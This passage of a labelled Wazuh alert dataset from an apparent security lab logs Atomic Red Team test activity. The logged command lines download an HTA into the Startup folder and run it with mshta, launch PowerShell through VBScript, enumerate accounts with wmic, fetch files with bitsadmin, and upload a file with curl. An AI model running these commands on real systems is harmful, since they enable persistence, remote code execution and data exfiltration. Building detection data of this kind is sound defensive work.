"EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751662181.60585451", "timestamp": "2025-07-04T20:49:41.899+0000"}, "fields": {"timestamp": ["2025-07-04T20:49:41.899Z"]}, "sort": [1751662181899]}}
{"id": "LBdc15cB1Hp-jZ7fQLEi", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "LBdc15cB1Hp-jZ7fQLEi", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "wmic.exe", "image": "C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-4721-6868-b804-000000001400}", "description": "WMI Commandline Utility", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c wmic useraccount get /ALL /format:csv", "processGuid": "{ff3427f9-4721-6868-ba04-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9880", "processId": "7912", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:26:57.204", "hashes": "SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "wmic  useraccount get /ALL /format:csv", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:26:57.204\r\nProcessGuid: {ff3427f9-4721-6868-ba04-000000001400}\r\nProcessId: 7912\r\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: WMI Commandline Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wmic.exe\r\nCommandLine: wmic  useraccount get /ALL /format:csv\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD\r\nParentProcessGuid: {ff3427f9-4721-6868-b804-000000001400}\r\nParentProcessId: 9880\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c wmic useraccount get /ALL /format:csv\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:26:57.2075639Z", "eventRecordID": "388534", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751664834.62277841", "timestamp": "2025-07-04T21:33:54.473+0000"}, "fields": {"timestamp": ["2025-07-04T21:33:54.473Z"]}, "sort": [1751664834473]}}
{"id": "OBdc15cB1Hp-jZ7firFj", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "OBdc15cB1Hp-jZ7firFj", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-4740-6868-bd04-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "9760", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:27:28.233", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c wmic process get caption,executablepath,commandline /format:csv", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:27:28.233\r\nProcessGuid: {ff3427f9-4740-6868-bd04-000000001400}\r\nProcessId: 9760\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c wmic process get caption,executablepath,commandline /format:csv\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:27:28.2367726Z", "eventRecordID": "388550", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 11, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751664854.62299891", "timestamp": "2025-07-04T21:34:14.489+0000"}, "fields": {"timestamp": ["2025-07-04T21:34:14.489Z"]}, "sort": [1751664854489]}}
{"id": "iBdg15cB1Hp-jZ7fKLFm", "description": "Powershell process spawned powershell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "iBdg15cB1Hp-jZ7fKLFm", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-4894-6868-1605-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "3504", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:33:08.543", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"powershell.exe\\\" &amp; {$var =Invoke-WebRequest \\\\\\\"\\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\\\\\\\"\\\" $var.content|out-file \\\\\\\"\\\"$env:appdata\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta\\\\\\\"\\\" mshta \\\\\\\"\\\"$env:appdata\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta\\\\\\\"\\\" start-sleep -s 15 stop-process -name \\\\\\\"\\\"calculator\\\\\\\"\\\" -Force -ErrorAction Ignore stop-process -name \\\\\\\"\\\"CalculatorApp\\\\\\\"\\\" -Force -ErrorAction Ignore}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 21:33:08.543\r\nProcessGuid: {ff3427f9-4894-6868-1605-000000001400}\r\nProcessId: 3504\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {$var =Invoke-WebRequest \\\"\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\\\"\"\n$var.content|out-file \\\"\"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\\\"\"\nmshta \\\"\"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\\\"\"\nstart-sleep -s 15\nstop-process -name \\\"\"calculator\\\"\" -Force -ErrorAction Ignore\nstop-process -name \\\"\"CalculatorApp\\\"\" -Force -ErrorAction Ignore}\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:33:08.5487280Z", "eventRecordID": "389092", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 20, "mail": false, "description": "Powershell process spawned powershell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92027"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665090.62700543", "timestamp": "2025-07-04T21:38:10.365+0000"}, "fields": {"timestamp": ["2025-07-04T21:38:10.365Z"]}, "sort": [1751665090365]}}
{"id": "ixdg15cB1Hp-jZ7fLLFL", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "ixdg15cB1Hp-jZ7fLLFL", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-4897-6868-1905-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\mshta.exe\\\" \\\"C:\\\\Users\\\\snell\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta\\\"", "processGuid": "{ff3427f9-4898-6868-1a05-000000001400}", "logonId": "0xa45f0", "parentProcessId": "8516", "processId": "8740", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:33:12.106", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\mshta.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /c calc.exe", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:33:12.106\r\nProcessGuid: {ff3427f9-4898-6868-1a05-000000001400}\r\nProcessId: 8740\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c calc.exe\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-4897-6868-1905-000000001400}\r\nParentProcessId: 8516\r\nParentImage: C:\\Windows\\System32\\mshta.exe\r\nParentCommandLine: \"C:\\WINDOWS\\system32\\mshta.exe\" \"C:\\Users\\snell\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:33:12.1198879Z", "eventRecordID": "389139", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 30, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665092.62714894", "timestamp": "2025-07-04T21:38:12.514+0000"}, "fields": {"timestamp": ["2025-07-04T21:38:12.514Z"]}, "sort": [1751665092514]}}
{"id": "hxdg15cB1Hp-jZ7fJLF6", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "hxdg15cB1Hp-jZ7fJLF6", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "MSHTA.EXE", "image": "C:\\\\Windows\\\\System32\\\\mshta.exe", "product": "Internet Explorer", "parentProcessGuid": "{ff3427f9-4892-6868-1105-000000001400}", "description": "Microsoft (R) HTML Application host", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c mshta vbscript:Execute(\\\"CreateObject(\\\"\\\"Wscript.Shell\\\"\\\").Run \\\"\\\"powershell -noexit -file C:\\\\AtomicRedTeam\\\\atomics\\\\T1218.005\\\\src\\\\powershell.ps1\\\"\\\":close\\\")", "processGuid": "{ff3427f9-4892-6868-1305-000000001400}", "logonId": "0xa45f0", "parentProcessId": "4804", "processId": "10204", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:33:06.450", "hashes": "SHA1=F5B4B0D669D8B81A280218C4FAD60B22047FA047,MD5=CB5971A176EF0CFD5FC77792E2000558,SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E,IMPHASH=71A59821E6458156CA7792C7A1D58E33", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "mshta  vbscript:Execute(\\\"CreateObject(\\\"\\\"Wscript.Shell\\\"\\\").Run \\\"\\\"powershell -noexit -file C:\\\\AtomicRedTeam\\\\atomics\\\\T1218.005\\\\src\\\\powershell.ps1\\\"\\\":close\\\")", "integrityLevel": "High", "fileVersion": "11.00.26100.2454 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:33:06.450\r\nProcessGuid: {ff3427f9-4892-6868-1305-000000001400}\r\nProcessId: 10204\r\nImage: C:\\Windows\\System32\\mshta.exe\r\nFileVersion: 11.00.26100.2454 (WinBuild.160101.0800)\r\nDescription: Microsoft (R) HTML Application host\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: MSHTA.EXE\r\nCommandLine: mshta  vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\powershell.ps1\"\":close\")\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=F5B4B0D669D8B81A280218C4FAD60B22047FA047,MD5=CB5971A176EF0CFD5FC77792E2000558,SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E,IMPHASH=71A59821E6458156CA7792C7A1D58E33\r\nParentProcessGuid: {ff3427f9-4892-6868-1105-000000001400}\r\nParentProcessId: 4804\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file C:\\AtomicRedTeam\\atomics\\T1218.005\\src\\powershell.ps1\"\":close\")\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:33:06.4562260Z", "eventRecordID": "389071", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 16, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665089.62693482", "timestamp": "2025-07-04T21:38:09.247+0000"}, "fields": {"timestamp": ["2025-07-04T21:38:09.247Z"]}, "sort": [1751665089247]}}
{"id": "yhdn15cB1Hp-jZ7fNbLI", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "yhdn15cB1Hp-jZ7fNbLI", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "bitsadmin.exe", "image": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-4b3e-6868-ed05-000000001400}", "description": "BITS administration utility", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c C:\\\\Windows\\\\System32\\\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\\\Atomic-license.txt", "processGuid": "{ff3427f9-4b3e-6868-ef05-000000001400}", "logonId": "0xa45f0", "parentProcessId": "68", "processId": "4488", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:44:30.831", "hashes": "SHA1=29EE300ACDAE46792A4E1BDD012D0C7FA1C5D13F,MD5=48E11CE37A4B73911D61CA9DB531E676,SHA256=2B090BB7151BF87FC6FA36E13F509B5059A68E694EEC2253F1AB74F9A7A0247B,IMPHASH=D93F8F73A9F8629D0A8B416A7FCEE86F", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1197,technique_name=BITS Jobs", "company": "Microsoft Corporation", "commandLine": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\Atomic-license.txt", "integrityLevel": "High", "fileVersion": "7.8.26100.1150 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1197,technique_name=BITS Jobs\r\nUtcTime: 2025-07-04 21:44:30.831\r\nProcessGuid: {ff3427f9-4b3e-6868-ef05-000000001400}\r\nProcessId: 4488\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.26100.1150 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: C:\\Windows\\System32\\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\\Users\\snell\\AppData\\Local\\Temp\\Atomic-license.txt\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=29EE300ACDAE46792A4E1BDD012D0C7FA1C5D13F,MD5=48E11CE37A4B73911D61CA9DB531E676,SHA256=2B090BB7151BF87FC6FA36E13F509B5059A68E694EEC2253F1AB74F9A7A0247B,IMPHASH=D93F8F73A9F8629D0A8B416A7FCEE86F\r\nParentProcessGuid: {ff3427f9-4b3e-6868-ed05-000000001400}\r\nParentProcessId: 68\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\\Atomic-license.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:44:30.8402163Z", "eventRecordID": "391384", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 22, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665553.63912591", "timestamp": "2025-07-04T21:45:53.296+0000"}, "fields": {"timestamp": ["2025-07-04T21:45:53.296Z"]}, "sort": [1751665553296]}}
{"id": "8hdp15cB1Hp-jZ7fQbJO", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "8hdp15cB1Hp-jZ7fQbJO", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "curl.exe", "image": "C:\\\\Windows\\\\System32\\\\curl.exe", "product": "The curl executable", "parentProcessGuid": "{ff3427f9-4bfa-6868-0e06-000000001400}", "description": "The curl executable", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c C:\\\\Windows\\\\System32\\\\Curl.exe -T c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe --upload-file 